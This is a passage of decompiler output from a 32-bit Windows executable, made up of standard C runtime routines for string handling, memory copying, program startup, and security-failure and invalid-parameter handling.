  if ((param_1 != 0) && (*(int *)(param_1 + -8) == 0xdddd)) {
    FUN_0040b61e();
  }
  return;
}



int __cdecl FUN_0040becf(ushort *param_1,ushort *param_2,int param_3)

{
  if (param_3 != 0) {
    for (; ((param_3 = param_3 + -1, param_3 != 0 && (*param_1 != 0)) && (*param_1 == *param_2));
        param_1 = param_1 + 1) {
      param_2 = param_2 + 1;
    }
    return (uint)*param_1 - (uint)*param_2;
  }
  return 0;
}



char * __cdecl FUN_0040bf10(char *param_1,char param_2)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = param_1;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = param_1 + 1;
    cVar1 = *param_1;
    param_1 = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while (param_2 != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != param_2) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



void __cdecl FUN_0040bf3d(undefined *param_1,uint param_2,int param_3)

{
  FUN_0040be0a(param_1,param_2,param_3,0,&stack0x00000010);
  return;
}



undefined4 __cdecl FUN_0040bf5b(char *param_1,int param_2,char *param_3)

{
  char cVar1;
  undefined4 *puVar2;
  char *pcVar3;
  undefined4 uStack_14;
  
  if ((param_1 != (char *)0x0) && (param_2 != 0)) {
    pcVar3 = param_1;
    if (param_3 != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        param_2 = param_2 + -1;
      } while (param_2 != 0);
      if (param_2 != 0) {
        do {
          cVar1 = *param_3;
          *pcVar3 = cVar1;
          pcVar3 = pcVar3 + 1;
          param_3 = param_3 + 1;
          if (cVar1 == '\0') break;
          param_2 = param_2 + -1;
        } while (param_2 != 0);
        if (param_2 != 0) {
          return 0;
        }
        *param_1 = '\0';
        puVar2 = (undefined4 *)FUN_0040caaa();
        uStack_14 = 0x22;
        *puVar2 = 0x22;
        goto LAB_0040bf7d;
      }
    }
    *param_1 = '\0';
  }
  puVar2 = (undefined4 *)FUN_0040caaa();
  uStack_14 = 0x16;
  *puVar2 = 0x16;
LAB_0040bf7d:
  FUN_0040ca42();
  return uStack_14;
}



undefined4 FUN_0040bfcf(uint param_1,uint param_2,uint param_3,int param_4)

{
  short *psVar1;
  short *in_EAX;
  undefined4 *puVar2;
  short *psVar3;
  short *psVar4;
  short sVar5;
  undefined4 uStack_18;
  uint local_8;
  
  if (in_EAX == (short *)0x0) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 0x16;
    FUN_0040ca42();
    return 0x16;
  }
  if (param_2 == 0) {
LAB_0040c003:
    puVar2 = (undefined4 *)FUN_0040caaa();
    uStack_18 = 0x16;
  }
  else {
    *in_EAX = 0;
    if ((param_4 != 0) + 1 < param_2) {
      if (0x22 < param_3 - 2) goto LAB_0040c003;
      psVar3 = in_EAX;
      if (param_4 != 0) {
        param_1 = -param_1;
        *in_EAX = 0x2d;
        psVar3 = in_EAX + 1;
      }
      local_8 = (uint)(param_4 != 0);
      psVar1 = psVar3;
      do {
        psVar4 = psVar1;
        sVar5 = (short)(param_1 % param_3);
        if (param_1 % param_3 < 10) {
          sVar5 = sVar5 + 0x30;
        }
        else {
          sVar5 = sVar5 + 0x57;
        }
        *psVar4 = sVar5;
        local_8 = local_8 + 1;
      } while ((param_1 / param_3 != 0) &&
              (psVar1 = psVar4 + 1, param_1 = param_1 / param_3, local_8 < param_2));
      if (local_8 < param_2) {
        psVar4[1] = 0;
        do {
          sVar5 = *psVar4;
          *psVar4 = *psVar3;
          *psVar3 = sVar5;
          psVar4 = psVar4 + -1;
          psVar3 = psVar3 + 1;
        } while (psVar3 < psVar4);
        return 0;
      }
      *in_EAX = 0;
    }
    puVar2 = (undefined4 *)FUN_0040caaa();
    uStack_18 = 0x22;
  }
  *puVar2 = uStack_18;
  FUN_0040ca42();
  return uStack_18;
}



void __cdecl FUN_0040c0c5(uint param_1,undefined4 param_2,uint param_3,uint param_4)

{
  int iVar1;
  
  if ((param_4 == 10) && ((int)param_1 < 0)) {
    iVar1 = 1;
    param_4 = 10;
  }
  else {
    iVar1 = 0;
  }
  FUN_0040bfcf(param_1,param_3,param_4,iVar1);
  return;
}



// WARNING: Removing unreachable block (ram,0x0040c119)
// WARNING: Removing unreachable block (ram,0x0040c122)

undefined (*) [16] FUN_0040c0f1(undefined4 param_1,undefined4 param_2)

{
  undefined (*pauVar1) [16];
  
  pauVar1 = FUN_004131f1();
  return pauVar1;
}



undefined4 __cdecl
FUN_0040c264(undefined (*param_1) [16],uint param_2,undefined4 *param_3,uint param_4)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  
  if (param_4 == 0) {
LAB_0040c274:
    uVar1 = 0;
  }
  else {
    if (param_1 == (undefined (*) [16])0x0) {
LAB_0040c27d:
      puVar2 = (undefined4 *)FUN_0040caaa();
      uVar1 = 0x16;
      *puVar2 = 0x16;
    }
    else {
      if ((param_3 != (undefined4 *)0x0) && (param_4 <= param_2)) {
        FUN_00410450((undefined4 *)param_1,param_3,param_4);
        goto LAB_0040c274;
      }
      FUN_0040f8c0(param_1,0,param_2);
      if (param_3 == (undefined4 *)0x0) goto LAB_0040c27d;
      if (param_4 <= param_2) {
        return 0x16;
      }
      puVar2 = (undefined4 *)FUN_0040caaa();
      uVar1 = 0x22;
      *puVar2 = 0x22;
    }
    FUN_0040ca42();
  }
  return uVar1;
}



undefined4 * __cdecl FUN_0040c2f0(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar1 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = param_3 >> 2;
      uVar3 = param_3 & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return param_1;
        case 2:
          goto switchD_0040c4d3_caseD_2;
        case 3:
          goto switchD_0040c4d3_caseD_3;
        }
        goto switchD_0040c4d3_caseD_1;
      }
    }
    else {
      switch(param_3) {
      case 0:
        goto switchD_0040c4d3_caseD_0;
      case 1:
        goto switchD_0040c4d3_caseD_1;
      case 2:
        goto switchD_0040c4d3_caseD_2;
      case 3:
        goto switchD_0040c4d3_caseD_3;
      default:
        uVar2 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0040c4d3_caseD_2;
            case 3:
              goto switchD_0040c4d3_caseD_3;
            }
            goto switchD_0040c4d3_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0040c4d3_caseD_2;
            case 3:
              goto switchD_0040c4d3_caseD_3;
            }
            goto switchD_0040c4d3_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0040c4d3_caseD_2;
            case 3:
              goto switchD_0040c4d3_caseD_3;
            }
            goto switchD_0040c4d3_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040c4d3_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return param_1;
    case 2:
switchD_0040c4d3_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return param_1;
    case 3:
switchD_0040c4d3_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return param_1;
    }
switchD_0040c4d3_caseD_0:
    return param_1;
  }
  if (((0xff < param_3) && (DAT_00425778 != 0)) && (((uint)param_1 & 0xf) == ((uint)param_2 & 0xf)))
  {
    puVar1 = FUN_00413396(param_1,param_2,param_3);
    return puVar1;
  }
  puVar1 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar2 = param_3 >> 2;
    uVar3 = param_3 & 3;
    if (7 < uVar2) {
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *param_2;
        param_2 = param_2 + 1;
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return param_1;
      case 2:
        goto switchD_0040c34c_caseD_2;
      case 3:
        goto switchD_0040c34c_caseD_3;
      }
      goto switchD_0040c34c_caseD_1;
    }
  }
  else {
    switch(param_3) {
    case 0:
      goto switchD_0040c34c_caseD_0;
    case 1:
      goto switchD_0040c34c_caseD_1;
    case 2:
      goto switchD_0040c34c_caseD_2;
    case 3:
      goto switchD_0040c34c_caseD_3;
    default:
      uVar2 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        uVar3 = uVar2 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar1 = (undefined4 *)((int)param_1 + 3);
        if (7 < uVar2) {
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + 1;
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0040c34c_caseD_2;
          case 3:
            goto switchD_0040c34c_caseD_3;
          }
          goto switchD_0040c34c_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar1 = (undefined4 *)((int)param_1 + 2);
        if (7 < uVar2) {
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + 1;
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0040c34c_caseD_2;
          case 3:
            goto switchD_0040c34c_caseD_3;
          }
          goto switchD_0040c34c_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)param_1 + 1);
        if (7 < uVar2) {
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + 1;
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0040c34c_caseD_2;
          case 3:
            goto switchD_0040c34c_caseD_3;
          }
          goto switchD_0040c34c_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = param_2[uVar2 - 7];
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = param_2[uVar2 - 6];
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = param_2[uVar2 - 5];
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = param_2[uVar2 - 4];
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = param_2[uVar2 - 3];
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = param_2[uVar2 - 2];
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = param_2[uVar2 - 1];
    param_2 = param_2 + uVar2;
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_0040c34c_caseD_1:
    *(undefined *)puVar1 = *(undefined *)param_2;
    return param_1;
  case 2:
switchD_0040c34c_caseD_2:
    *(undefined *)puVar1 = *(undefined *)param_2;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
    return param_1;
  case 3:
switchD_0040c34c_caseD_3:
    *(undefined *)puVar1 = *(undefined *)param_2;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
    return param_1;
  }
switchD_0040c34c_caseD_0:
  return param_1;
}



void __cdecl FUN_0040c655(int param_1)

{
  if (DAT_004239d8 == 1) {
    FUN_0040f05f();
  }
  FUN_0040eeb4(param_1);
  FUN_0040ec00(0xff);
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040c6e5)

undefined4 FUN_0040c67e(void)

{
  int iVar1;
  short *psVar2;
  undefined4 uVar3;
  uint extraout_ECX;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420420,0x58);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  GetStartupInfoW((LPSTARTUPINFOW)(unaff_EBP + -0x68));
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  iVar1 = FUN_0040eb4c(1);
  if (iVar1 == 0) {
    FUN_0040c655(0x1c);
  }
  iVar1 = FUN_0040cf03();
  if (iVar1 == 0) {
    FUN_0040c655(0x10);
  }
  FUN_00413a68();
  *(undefined4 *)(unaff_EBP + -4) = 1;
  iVar1 = FUN_0040dc85();
  if (iVar1 < 0) {
    FUN_0040ebac(0x1b);
  }
  DAT_004268e4 = GetCommandLineW();
  DAT_004239d4 = FUN_00413a0b();
  iVar1 = FUN_0041395d(extraout_ECX);
  if (iVar1 < 0) {
    FUN_0040ebac(8);
  }
  iVar1 = FUN_0041372e();
  if (iVar1 < 0) {
    FUN_0040ebac(9);
  }
  iVar1 = FUN_0040ec6b(1);
  if (iVar1 != 0) {
    FUN_0040ebac(iVar1);
  }
  psVar2 = (short *)FUN_004136e8();
  uVar3 = FUN_004010a0((HINSTANCE)&IMAGE_DOS_HEADER_00400000,0,psVar2);
  *(undefined4 *)(unaff_EBP + -0x20) = uVar3;
  if (*(int *)(unaff_EBP + -0x1c) == 0) {
    FUN_0040ee1c(uVar3);
  }
  FUN_0040ee48();
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  return *(undefined4 *)(unaff_EBP + -0x20);
}



void entry(void)

{
  FUN_00413ab4();
  FUN_0040c67e();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_0040c805(undefined4 param_1,undefined4 param_2,undefined param_3)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_00423af8 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_00423afc = &param_3;
  _DAT_00423a38 = 0x10001;
  _DAT_004239e0 = 0xc0000409;
  _DAT_004239e4 = 1;
  local_32c = DAT_00422044;
  local_328 = DAT_00422048;
  _DAT_004239ec = unaff_retaddr;
  _DAT_00423ac4 = in_GS;
  _DAT_00423ac8 = in_FS;
  _DAT_00423acc = in_ES;
  _DAT_00423ad0 = in_DS;
  _DAT_00423ad4 = unaff_EDI;
  _DAT_00423ad8 = unaff_ESI;
  _DAT_00423adc = unaff_EBX;
  _DAT_00423ae0 = param_2;
  _DAT_00423ae4 = param_1;
  _DAT_00423ae8 = in_EAX;
  _DAT_00423aec = unaff_EBP;
  DAT_00423af0 = unaff_retaddr;
  _DAT_00423af4 = in_CS;
  _DAT_00423b00 = in_SS;
  DAT_00423a30 = IsDebuggerPresent();
  FUN_00413b4a();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&DAT_0041c288);
  if (DAT_00423a30 == 0) {
    FUN_00413b4a();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



void __cdecl FUN_0040c90b(undefined4 param_1)

{
  DAT_00423d04 = param_1;
  return;
}



void FUN_0040c91a(void)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  HANDLE hProcess;
  undefined4 extraout_EDX;
  UINT uExitCode;
  undefined local_32c [4];
  undefined4 local_328;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  uVar1 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_32c = (undefined  [4])0x0;
  FUN_0040f8c0((undefined (*) [16])(local_32c + 4),0,0x4c);
  local_2dc.ExceptionRecord = (PEXCEPTION_RECORD)local_32c;
  local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_32c = (undefined  [4])0xc0000417;
  local_328 = 1;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_2dc);
  if ((LVar3 == 0) && (BVar2 == 0)) {
    FUN_00413b4a();
  }
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  FUN_0040a982(uVar1 ^ (uint)&stack0xfffffffc,extraout_EDX);
  return;
}



void FUN_0040ca42(void)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)FUN_0040cb6e(DAT_00423d04);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040ca58. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  FUN_00413b4a();
  FUN_0040c91a();
  return;
}



int __cdecl FUN_0040ca68(int param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00422050)[uVar1 * 2]) {
      return (&DAT_00422054)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13U < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbcU) & 0xe) + 8;
}



undefined * FUN_0040caaa(void)

{
  undefined (*pauVar1) [16];
  
  pauVar1 = FUN_0040cd41();
  if (pauVar1 == (undefined (*) [16])0x0) {
    return &DAT_004221b8;
  }
  return *pauVar1 + 8;
}



undefined * FUN_0040cabd(void)

{
  undefined (*pauVar1) [16];
  
  pauVar1 = FUN_0040cd41();
  if (pauVar1 == (undefined (*) [16])0x0) {
    return &DAT_004221bc;
  }
  return *pauVar1 + 0xc;
}



void __cdecl FUN_0040cad0(int param_1)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)FUN_0040cabd();
  *piVar1 = param_1;
  iVar2 = FUN_0040ca68(param_1);
  piVar1 = (int *)FUN_0040caaa();
  *piVar1 = iVar2;
  return;
}



int __cdecl FUN_0040caf3(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_004221c4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_004221c0 != -1)) {
    iVar3 = DAT_004221c0;
    pcVar2 = (code *)TlsGetValue(DAT_004221c4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1f8);
      goto LAB_0040cb53;
    }
  }
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c2a0);
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)FUN_0040eb7c(u_KERNEL32_DLL_0041c2a0), hModule == (HMODULE)0x0)) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_EncodePointer_0041c290);
LAB_0040cb53:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



void FUN_0040cb65(void)

{
  FUN_0040caf3(0);
  return;
}



int __cdecl FUN_0040cb6e(int param_1)

{
  LPVOID pvVar1;
  code *pcVar2;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  
  pvVar1 = TlsGetValue(DAT_004221c4);
  if ((pvVar1 != (LPVOID)0x0) && (DAT_004221c0 != -1)) {
    iVar3 = DAT_004221c0;
    pcVar2 = (code *)TlsGetValue(DAT_004221c4);
    iVar3 = (*pcVar2)(iVar3);
    if (iVar3 != 0) {
      pFVar4 = *(FARPROC *)(iVar3 + 0x1fc);
      goto LAB_0040cbce;
    }
  }
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c2a0);
  if ((hModule == (HMODULE)0x0) &&
     (hModule = (HMODULE)FUN_0040eb7c(u_KERNEL32_DLL_0041c2a0), hModule == (HMODULE)0x0)) {
    return param_1;
  }
  pFVar4 = GetProcAddress(hModule,s_DecodePointer_0041c2bc);
LAB_0040cbce:
  if (pFVar4 != (FARPROC)0x0) {
    param_1 = (*pFVar4)(param_1);
  }
  return param_1;
}



LPVOID FUN_0040cbe9(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(DAT_004221c4);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = (LPVOID)FUN_0040cb6e(DAT_00423d0c);
    TlsSetValue(DAT_004221c4,lpTlsValue);
  }
  return lpTlsValue;
}



void FUN_0040cc1d(void)

{
  code *pcVar1;
  int iVar2;
  
  if (DAT_004221c0 != -1) {
    iVar2 = DAT_004221c0;
    pcVar1 = (code *)FUN_0040cb6e(DAT_00423d14);
    (*pcVar1)(iVar2);
    DAT_004221c0 = -1;
  }
  if (DAT_004221c4 != 0xffffffff) {
    TlsFree(DAT_004221c4);
    DAT_004221c4 = 0xffffffff;
  }
  FUN_0040df24();
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void FUN_0040cc5a(void)

{
  int iVar1;
  int iVar2;
  HMODULE hModule;
  FARPROC pFVar3;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420448,0xc);
  hModule = GetModuleHandleW(u_KERNEL32_DLL_0041c2a0);
  if (hModule == (HMODULE)0x0) {
    hModule = (HMODULE)FUN_0040eb7c(u_KERNEL32_DLL_0041c2a0);
  }
  *(HMODULE *)(unaff_EBP + -0x1c) = hModule;
  iVar1 = *(int *)(unaff_EBP + 8);
  *(undefined **)(iVar1 + 0x5c) = &DAT_0041cae8;
  *(undefined4 *)(iVar1 + 0x14) = 1;
  if (hModule != (HMODULE)0x0) {
    pFVar3 = GetProcAddress(hModule,s_EncodePointer_0041c290);
    *(FARPROC *)(iVar1 + 0x1f8) = pFVar3;
    pFVar3 = GetProcAddress(*(HMODULE *)(unaff_EBP + -0x1c),s_DecodePointer_0041c2bc);
    *(FARPROC *)(iVar1 + 0x1fc) = pFVar3;
  }
  *(undefined4 *)(iVar1 + 0x70) = 1;
  *(undefined *)(iVar1 + 200) = 0x43;
  *(undefined *)(iVar1 + 0x14b) = 0x43;
  *(undefined **)(iVar1 + 0x68) = &DAT_00422790;
  FUN_0040e055(0xd);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  InterlockedIncrement(*(LONG **)(iVar1 + 0x68));
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  FUN_0040cd2f();
  FUN_0040e055(0xc);
  *(undefined4 *)(unaff_EBP + -4) = 1;
  iVar2 = *(int *)(unaff_EBP + 0xc);
  *(int *)(iVar1 + 0x6c) = iVar2;
  if (iVar2 == 0) {
    *(undefined4 *)(iVar1 + 0x6c) = DAT_00422d98;
  }
  FUN_00411f15(*(LONG **)(iVar1 + 0x6c));
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  FUN_0040cd38();
  return;
}



void FUN_0040cd2f(void)

{
  FUN_0040df7b(0xd);
  return;
}



void FUN_0040cd38(void)

{
  FUN_0040df7b(0xc);
  return;
}



undefined (*) [16] FUN_0040cd41(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  undefined (*pauVar2) [16];
  int iVar3;
  DWORD DVar4;
  undefined4 uVar5;
  undefined (*pauVar6) [16];
  
  dwErrCode = GetLastError();
  uVar5 = DAT_004221c0;
  pcVar1 = (code *)FUN_0040cbe9();
  pauVar2 = (undefined (*) [16])(*pcVar1)(uVar5);
  if (pauVar2 == (undefined (*) [16])0x0) {
    pauVar2 = FUN_00413b97(1,0x214);
    if (pauVar2 != (undefined (*) [16])0x0) {
      uVar5 = DAT_004221c0;
      pauVar6 = pauVar2;
      pcVar1 = (code *)FUN_0040cb6e(DAT_00423d10);
      iVar3 = (*pcVar1)(uVar5,pauVar6);
      if (iVar3 == 0) {
        FUN_0040b61e();
        pauVar2 = (undefined (*) [16])0x0;
      }
      else {
        FUN_0040cc5a();
        DVar4 = GetCurrentThreadId();
        *(undefined4 *)(*pauVar2 + 4) = 0xffffffff;
        *(DWORD *)*pauVar2 = DVar4;
      }
    }
  }
  SetLastError(dwErrCode);
  return pauVar2;
}



undefined (*) [16] FUN_0040cdba(void)

{
  undefined (*pauVar1) [16];
  
  pauVar1 = FUN_0040cd41();
  if (pauVar1 == (undefined (*) [16])0x0) {
    FUN_0040ebac(0x10);
  }
  return pauVar1;
}



void FUN_0040ceee(void)

{
  FUN_0040df7b(0xd);
  return;
}



